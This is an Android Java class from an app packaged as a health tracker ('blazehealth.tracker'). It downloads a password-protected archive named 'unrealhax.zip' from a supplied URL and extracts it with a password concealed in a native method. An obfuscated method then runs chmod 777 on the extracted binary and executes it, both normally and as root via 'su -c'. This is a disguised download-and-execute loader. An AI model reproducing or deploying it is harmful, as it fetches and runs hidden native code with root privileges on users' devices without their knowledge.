package com.blazehealth.tracker.Component;

import android.app.ProgressDialog;
import android.content.Context;
import android.os.AsyncTask;
import android.annotation.SuppressLint;

import net.lingala.zip4j.ZipFile;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class DownloadZip extends AsyncTask<String, String, String> {
    private Context context;
    private ProgressDialog progressDialog;
    public static boolean checkdonwload = false;

    @SuppressLint("UseCompatLoadingForDrawables")
    private native String pw();

    public DownloadZip(Context context) {
        this.context = context;
        progressDialog = new ProgressDialog(context);
        progressDialog.setTitle("Please Wait");
        progressDialog.setMessage("Downloading data... Don't close the app.");
        progressDialog.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL);
        progressDialog.setCancelable(false);
        progressDialog.setMax(100);
        progressDialog.show();
    }

    @Override
    protected void onPreExecute() {
        super.onPreExecute();
    }

    @Override
    protected String doInBackground(String... strings) {
        try {
            URL url = new URL(strings[1]);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.connect();
            int lengthOfFile = connection.getContentLength();

            InputStream input = connection.getInputStream();
            File pathBase = new File(context.getFilesDir().getPath());
            if (!pathBase.exists()) pathBase.mkdirs();

            File pathOutput = new File(pathBase, "unrealhax.zip");
            OutputStream output = new FileOutputStream(pathOutput);

            byte data[] = new byte[1024];
            long total = 0;
            int count;
            while ((count = input.read(data)) != -1) {
                total += count;
                publishProgress("" + (int) ((total * 100) / lengthOfFile));
                output.write(data, 0, count);
            }

            output.close();
            input.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    @Override
    protected void onProgressUpdate(String... progress) {
        progressDialog.setProgress(Integer.parseInt(progress[0]));
    }

    @Override
    protected void onPostExecute(String result) {
        File pathBase = new File(context.getFilesDir().getPath());
        File zipFile = new File(pathBase, "unrealhax.zip");

        try {
            // Extract with Zip4j using password
            zip4j(zipFile.getAbsolutePath(), pathBase.getAbsolutePath(), pw());

            // Delete zip
            if (zipFile.exists()) zipFile.delete();

        } catch (Exception e) {
            e.printStackTrace();
        }

        progressDialog.dismiss();
        checkdonwload = true;
    }

    private boolean zip4j(String path, String outpath, String password) {
        try {
            new ZipFile(path, password.toCharArray()).extractAll(outpath);
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
        return true;
    }

    private void ExecuteElf(String shell) {
        try {
            Runtime.getRuntime().exec(shell, null, null);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void jknfthrbvgy(String path) {
        try {
            ExecuteElf("chmod 777 " + context.getFilesDir() + path);
            ExecuteElf(context.getFilesDir() + path);
            ExecuteElf("su -c chmod 777 " + context.getFilesDir() + path);
            ExecuteElf("su -c " + context.getFilesDir() + path);
        } catch (Exception ignored) {}
    }

    void deleteRecursive(File fileOrDirectory) {
        if (fileOrDirectory.isDirectory())
            for (File child : fileOrDirectory.listFiles())
                deleteRecursive(child);

        fileOrDirectory.delete();
    }
}
